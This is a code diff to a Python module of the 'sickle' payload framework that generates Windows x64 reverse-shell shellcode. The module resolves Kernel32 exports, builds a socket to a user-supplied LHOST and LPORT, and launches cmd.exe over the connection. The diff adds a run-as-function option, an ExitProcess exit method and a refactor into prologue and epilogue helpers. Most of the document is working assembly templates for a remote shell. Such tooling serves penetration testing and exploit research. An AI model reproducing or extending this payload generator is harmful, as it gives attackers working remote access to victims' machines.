@@ -5,6 +5,7 @@ import struct
 from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.programmer import builder
+from sickle.common.lib.programmer import stubhub
 
 from sickle.common.lib.reversing.assembler import Assembler
 
@@ -18,7 +19,6 @@ from sickle.common.headers.windows import (
 )
 
 # TODO: Make register saving optional, switch between shell envs (powershell, cmd.exe)
-# SAVEREGS: NOT DONE
 # SHELL ENV CHANGE: NOT DONE
 
 class Shellcode():
@@ -61,15 +61,20 @@ class Shellcode():
 
     arguments["SHELL"] = {}
     arguments["SHELL"]["optional"] = "yes"
-    arguments["SHELL"]["description"] = "Shell environment (e.g powershell.exe, cmd.exe)"
+    arguments["SHELL"]["description"] = "Shell environment"
 
     advanced = {}
+    advanced["OP_AS_FUNC"] = {}
+    advanced["OP_AS_FUNC"]["optional"] = "yes"
+    advanced["OP_AS_FUNC"]["description"] = "Generate shellcode that operates as function"
+
     advanced["EXITFUNC"] = {}
     advanced["EXITFUNC"]["optional"] = "yes"
     advanced["EXITFUNC"]["description"] = "Exit technique"
 
     advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
-                                        "thread": "Exit as a thread" }
+                                        "thread": "Exit as a thread",
+                                        "process": "Exit as a process" }
 
     def __init__(self, arg_object):
 
@@ -113,7 +118,7 @@ class Shellcode():
             exit(-1)
 
         # Set the shell environment that will be used by the shellcode
-        if ("SHELL" not in argv_dict.keys()):
+        if "SHELL" not in argv_dict.keys():
             self.shell = "cmd.exe"
         else:
             self.shell = argv_dict["SHELL"]
@@ -127,7 +132,7 @@ class Shellcode():
         self.shell_env_len = len(self.shell)
 
         # Extract the LHOST & LPORT
-        if ("LPORT" not in argv_dict.keys()):
+        if "LPORT" not in argv_dict.keys():
             self.lport = 4444
         else:
             self.lport = int(argv_dict["LPORT"])
@@ -135,15 +140,27 @@ class Shellcode():
         self.lhost = argv_dict['LHOST']
 
         # Set the EXITFUNC
-        if ("EXITFUNC" not in argv_dict.keys()):
+        if "EXITFUNC" not in argv_dict.keys():
             self.exit_func = ""
         else:
             self.exit_func = argv_dict["EXITFUNC"]
 
+        # Update the necessary dependencies
         if self.exit_func == "thread":
             self.dependencies["ntdll.dll"] = "RtlExitUserThread",
+        elif self.exit_func == "process":
+            self.dependencies["Kernel32.dll"] += "ExitProcess",
         else:
             self.dependencies["Kernel32.dll"] += "TerminateProcess",
+
+        # Change the shellcode operation based on how execution will be performed
+        if "OP_AS_FUNC" not in argv_dict.keys():
+            self.op_as_func = False
+        else:
+            if argv_dict["OP_AS_FUNC"].lower() == "false":
+                self.op_as_func = False
+            else:
+                self.op_as_func = True
 
         return 0
 
@@ -151,8 +168,7 @@ class Shellcode():
         """Generates stub for obtaining the base address of Kernel32.dll
         """
 
-        stub = f"""
-getKernel32:
+        stub = f"""getKernel32:
     push rbp
     mov rbp, rsp
     mov dl, 0x4b
@@ -300,13 +316,27 @@ get_{imports[func]}:
         sin_port = struct.pack('<H', self.lport).hex()
         sin_family = struct.pack('>H', ws2def.AF_INET).hex()
 
-        shellcode = f"""
-_start:
-    push rbp
-    mov rbp, rsp
-    sub rsp, {self.stack_space}
-    and rsp, 0xfffffffffffffff0
+        shellcode = stubhub.get_win_prologue(self.op_as_func, self.stack_space)
 
+#        shellcode = """
+#_start:
+#"""
+#        if self.op_as_func == True:
+#            shellcode += """
+#    push rbp
+#    mov rbp, rsp
+#            """
+#        
+#        shellcode += f"""
+#    sub rsp, {self.stack_space}
+#"""
+#
+#        if self.op_as_func == False:
+#            shellcode += """
+#    and rsp, 0xfffffffffffffff0
+#            """
+#
+        shellcode += """
     call getKernel32
     mov rdi, rax
 """
@@ -403,36 +433,53 @@ call_CreateProccessA:
     mov [rsp + 0x48], rbx
     mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
     call rax
-        """
 
-        if self.exit_func == "thread":
-            shellcode += f"""
-; RAX => RtlExitUserThread([in] DWORD dwExitCode); // RCX => 0
-call_ExitThread:
-    xor rcx, rcx
-    mov rax, [rbp - {self.storage_offsets['RtlExitUserThread']}]
-    call rax
-            """
-        elif self.exit_func == "terminate":
-            shellcode += f"""
-; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
-;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
-call_TerminateProcess:
-	xor rcx, rcx
-	dec rcx
-	xor rdx, rdx
-	mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
-	call rax
-            """
-        else:
-            shellcode += """
-fin:
-    leave
-    ret
-            """
+"""
+
+#        if self.exit_func == "thread":
+#            shellcode += f"""
+#; RAX => RtlExitUserThread([in] DWORD dwExitCode); // RCX => 0
+#call_RtlExitUserThread:
+#    xor rcx, rcx
+#    mov rax, [rbp - {self.storage_offsets['RtlExitUserThread']}]
+#    call rax
+#            """
+#        elif self.exit_func == "process":
+#            shellcode += f"""
+#; RAX => ExitProcess([in] UINT uExitCode); // RCX => 0
+#call_ExitProcess:
+#    xor rcx, rcx
+#    mov rax, [rbp - {self.storage_offsets['ExitProcess']}]
+#    call rax
+#            """
+#        elif self.exit_func == "terminate":
+#            shellcode += f"""
+#; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
+#;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
+#call_TerminateProcess:
+#	xor rcx, rcx
+#	dec rcx
+#	xor rdx, rdx
+#	mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
+#	call rax
+#            """
+#
+#        if self.op_as_func == True:
+#            shellcode += """
+#fin:
+#    leave
+#    ret
+#            """
+
+        shellcode += stubhub.get_win_epilogue(self.op_as_func,
+                                              self.exit_func,
+                                              self.storage_offsets)
 
         shellcode += self.get_kernel32()
+
         shellcode += self.lookup_function()
+
+        print(shellcode)
 
         return shellcode
 
